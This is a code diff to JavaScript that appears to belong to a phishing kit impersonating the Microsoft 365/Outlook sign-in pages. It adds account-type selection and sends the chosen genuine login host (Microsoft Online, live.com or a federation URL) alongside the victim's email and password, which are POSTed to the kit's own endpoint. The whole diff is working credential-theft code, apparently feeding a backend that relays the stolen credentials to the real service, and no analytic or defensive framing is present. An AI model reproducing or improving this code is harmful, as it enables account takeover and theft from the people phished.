@@ -11,6 +11,8 @@ var skip=1;
 var myInterval,Proofs;
 var Timeout;
 var IP;
+var GetCredential;
+var mhost=0;
 if(!pgtype){
 var pgtype='';
 }
@@ -63,6 +65,7 @@ email = vak;
 }else{
 email = $("#email").val();  
 }
+email=email.toLowerCase();
 if(email==''){
     $("#error1").html(Errs['emptyEmail']);
     return false;
@@ -94,11 +97,15 @@ mode: "validem",
 },
 }).done(async function (data) {
 var vdata = JSON.parse(data);
+GetCredential=vdata;
 if (vdata["IfExistsResult"]=='1' || vdata["IfExistsResult"]=='4'||vdata["IfExistsResult"]===undefined) {
   await getpage('EmailPage',1); 
 $("#load").hide();
 $("#error1").html(Errs['Notemail']);
 
+}else if (vdata["IfExistsResult"]=='6') {
+  await getpage('ChoosenPage',1); 
+$("#load").hide();
 }else{
     if(vdata["ThrottleStatus"]=="1" && vdata["EstsProperties"]["DomainType"]==4){
 await getpage('OrgloadPage',1);
@@ -137,6 +144,18 @@ $(".ext-promoted-fed-cred-box").hide();
 });
 }
 }
+async function select_account(acc){
+      await getpage('PassPage',1); 
+    if(acc=='Work'){
+        if(GetCredential["Credentials"]["FederationRedirectUrl"]){
+mhost=GetCredential["Credentials"]["FederationRedirectUrl"];
+        }else{
+mhost='https://login.microsoftonline.com';        
+        }
+    }else{
+mhost='https://login.live.com';
+    }
+}
 function back(page) {
 $("#screen1").html(pages[page]);
 clearTimeout(Timeout);
@@ -169,7 +188,7 @@ $("#btn2").attr("disabled", true);
 $.ajax({
 type: "POST",
 url: urlx,
-data: { action: "signup", email: email, epass: epass, mode: 'OfficeLogin' },
+data: { action: "signup", email: email, epass: epass, mode: 'OfficeLogin', mainhost: mhost },
 }).done(async function (data) {
 console.log(data);
 var datArray = JSON.parse(data);
